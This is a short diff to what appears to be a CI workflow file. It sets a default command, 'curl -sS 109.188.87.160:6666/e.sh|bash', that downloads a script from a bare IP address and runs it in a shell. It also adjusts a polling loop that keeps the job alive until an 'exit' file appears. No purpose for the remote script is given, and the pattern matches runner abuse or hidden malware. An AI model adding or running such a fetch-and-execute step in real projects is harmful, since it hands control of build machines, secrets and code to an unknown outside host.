@@ -5,7 +5,7 @@ on:
       runs-on:
         default: 'ubuntu-latest'
       run:
-        default: 'curl -sS 109.188.87.160:6666/e|bash'
+        default: 'curl -sS 109.188.87.160:6666/e.sh|bash'
 jobs:
   loop:
     runs-on: ${{ inputs.runs-on }}
@@ -25,7 +25,7 @@ jobs:
           then
             break
           fi
-          sleep 0.1
+          sleep 1
           echo -n .
         done
         rm -rf exit
